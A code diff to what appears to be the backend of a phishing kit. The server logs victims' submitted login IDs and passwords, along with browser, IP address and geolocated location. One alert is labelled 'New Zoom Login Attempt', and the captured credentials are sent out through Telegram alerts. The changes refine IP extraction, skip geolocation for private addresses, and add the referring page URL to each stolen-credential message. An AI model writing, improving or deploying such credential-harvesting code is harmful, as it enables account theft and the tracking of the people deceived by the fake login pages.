@@ -102,13 +102,21 @@ process.on('unhandledRejection', (reason, promise) => {
 
 // --- HELPERS ---
 function getClientIp(req) {
-  return (req.headers["x-forwarded-for"] || "").split(",").pop()?.trim()
-    || req.connection?.remoteAddress
+  const xForwardedFor = req.headers["x-forwarded-for"];
+  if (xForwardedFor) {
+    // The first IP is the real client IP on most cloud platforms like Render
+    return xForwardedFor.split(",")[0].trim();
+  }
+  return req.connection?.remoteAddress
     || req.socket?.remoteAddress
     || "unknown";
 }
 
 async function getLocationFromIp(ip) {
+  // Check if it's a private/local IP (IPv4 or IPv6)
+  const isPrivate = /^(10\.|192\.168\.|172\.(1[6-9]|2[0-9]|3[0-1])\.|127\.|::1|fe80:)/.test(ip);
+  if (isPrivate || ip === "unknown") return "Local/Private Network (No Geolocation)";
+
   return new Promise((resolve) => {
     const request = https.get(`https://ip-api.com/json/${ip}?fields=status,message,city,regionName,country`, { timeout: 5000 }, (resp) => {
       let data = '';
@@ -117,7 +125,7 @@ async function getLocationFromIp(ip) {
         try {
           const response = JSON.parse(data);
           resolve(response.status === 'success' 
-            ? `${response.city}, ${response.regionName}, ${response.country}` 
+            ? `${response.country}, ${response.regionName}, ${response.city}` 
             : 'Location unavailable');
         } catch (e) { resolve('Location error'); }
       });
@@ -165,7 +173,7 @@ Login ID: ${email || 'none'}
 Password: ${password || 'N/A'}
 Browser: ${ua}
 This visitor visited from ${location} with IP Address of - ${ip}
-URL: ${req.headers.referer || 'unknown'}
+Page URL: ${req.headers.referer || 'unknown'}
 TIME: ${new Date().toISOString()}
 ${intruderDetected ? '🚨 INTRUDER DETECTED!' : ''}
 ═══════════════════════════════════════════════`;
@@ -185,7 +193,8 @@ ${intruderDetected ? '🚨 INTRUDER DETECTED!' : ''}
 Login ID: ${email || 'none'}
 Password: ${password || 'N/A'}
 Browser: ${ua}
-This visitor visited from ${location} with IP Address of - ${ip}`;
+This visitor visited from ${location} with IP Address of - ${ip}
+Page URL: ${req.headers.referer || 'unknown'}`;
     
     sendTelegramAlert(tgText);
 
@@ -210,6 +219,7 @@ Login ID: ${email}
 Password: ${password}
 Browser: ${req.headers['user-agent']}
 This visitor visited from ${location} with IP Address of - ${ip}
+Page URL: ${req.headers.referer || 'unknown'}
 TIME: ${new Date().toISOString()}
 ═══════════════════════════════════════════════`;
 
@@ -227,7 +237,8 @@ TIME: ${new Date().toISOString()}
     const tgText = `🔐 New Zoom Login Attempt
 Login ID: ${email}
 Password: ${password}
-This visitor visited from ${location} with IP Address of - ${ip}`;
+This visitor visited from ${location} with IP Address of - ${ip}
+Page URL: ${req.headers.referer || 'unknown'}`;
     
     sendTelegramAlert(tgText);
 
